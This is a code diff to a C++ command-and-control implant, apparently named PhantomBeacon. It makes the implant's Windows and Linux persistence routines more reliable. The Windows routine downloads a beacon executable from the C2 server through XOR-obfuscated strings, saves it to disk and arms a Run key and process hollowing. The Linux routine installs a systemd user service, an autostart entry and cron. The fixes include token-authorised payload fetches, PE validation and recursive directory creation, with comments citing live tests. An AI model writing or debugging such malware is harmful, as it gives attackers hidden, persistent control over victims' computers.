@@ -58,14 +58,22 @@ inline std::string establish_windows(const net::C2Config& cfg, const std::string
     // ── Strategy 2 (fallback): classic PE on disk + self-hollow ────────
     std::string exePath = dir + "\\" + name + ".exe";
 
-    // Download full beacon PE from C2
+    // Download full beacon PE from C2. The beacon id MUST travel with the
+    // request: the server authorises a payload fetch through the per-beacon
+    // download token derived from X-Beacon-Id, so omitting it returns 403
+    // (live defect 2026-10-19: persist wrote the 29-byte error body to disk
+    // as PhantomBeacon.exe and armed a RunKey pointing at it).
     std::string payload = net::http_request(cfg,
         XOR_WDEC(XOR_WSTR(L"GET")).c_str(),
-        XOR_WDEC(XOR_WSTR(L"/api/v1/payload")).c_str(), "", "");
-    if (payload.empty()) {
-        return std::string("Error: Failed to download beacon PE from C2 (host=")
-            + std::string(cfg.host.begin(), cfg.host.end()) + ":"
-            + std::to_string(cfg.port) + ")";
+        XOR_WDEC(XOR_WSTR(L"/api/v1/payload")).c_str(), "", cfg.beacon_id);
+    // A payload fetch that comes back as an HTTP error page, a redirect body
+    // or an empty response must never be armed as an executable: verify the
+    // DOS/PE magic before anything touches the filesystem.
+    if (payload.size() < 4096 || payload[0] != 'M' || payload[1] != 'Z') {
+        return std::string("Error: Payload download rejected (") +
+            std::to_string(payload.size()) +
+            " bytes, not a PE) — refusing to arm persistence. Check that "
+            "the listener serves /api/v1/payload to this beacon's token.";
     }
 
     // Save beacon PE to disk
@@ -77,6 +85,11 @@ inline std::string establish_windows(const net::C2Config& cfg, const std::string
     DWORD written = 0;
     WriteFile(hFile, payload.data(), (DWORD)payload.size(), &written, NULL);
     CloseHandle(hFile);
+    if (written != payload.size()) {
+        DeleteFileA(exePath.c_str());
+        return std::string("Error: Short write to ") + exePath +
+            " — on-disk copy removed, persistence NOT armed.";
+    }
 
     // Run it once to establish the hollowed child
     std::string runCmd = std::string("\"") + exePath + "\"";
@@ -144,6 +157,20 @@ inline std::string remove_windows(const std::string& name) {
 // ── Linux persistence (systemd + .desktop + cron) ────────────────────────────
 #elif defined(__linux__)
 
+// Recursive mkdir (mkdir -p): the single-level mkdir() failed silently when
+// ~/.config/systemd did not exist yet, so the user-service arm of Linux
+// persistence never installed (live test 2026-10-19: persist reported only
+// [autostart] + [cron]). Recreate every missing parent.
+inline void mkdir_p(const std::string& path) {
+    std::string cur;
+    for (size_t i = 0; i < path.size(); ++i) {
+        cur += path[i];
+        if (path[i] == '/' || i + 1 == path.size()) {
+            if (cur != "/" && !cur.empty()) mkdir(cur.c_str(), 0755);
+        }
+    }
+}
+
 inline std::string establish_linux(const std::string& name) {
     char buf[1024];
     ssize_t len = readlink("/proc/self/exe", buf, sizeof(buf) - 1);
@@ -157,7 +184,7 @@ inline std::string establish_linux(const std::string& name) {
 
     // Copy binary to ~/.local/bin/ so it survives /tmp/ cleanup
     std::string installDir = home + "/.local/bin";
-    mkdir(installDir.c_str(), 0755);
+    mkdir_p(installDir);
     std::string installPath = installDir + "/" + exeName;
     std::ifstream src(curPath, std::ios::binary);
     std::ofstream dst(installPath, std::ios::binary);
@@ -171,7 +198,7 @@ inline std::string establish_linux(const std::string& name) {
 
     // 1) systemd user service
     std::string systemdDir = home + "/.config/systemd/user";
-    mkdir(systemdDir.c_str(), 0755);
+    mkdir_p(systemdDir);
     std::string serviceFile = systemdDir + "/" + name + ".service";
     {
         std::ofstream ofs(serviceFile);
@@ -197,7 +224,7 @@ inline std::string establish_linux(const std::string& name) {
 
     // 2) .desktop autostart (for desktop environments)
     std::string autostartDir = home + "/.config/autostart";
-    mkdir(autostartDir.c_str(), 0755);
+    mkdir_p(autostartDir);
     std::string desktopFile = autostartDir + "/" + name + ".desktop";
     {
         std::ofstream ofs(desktopFile);
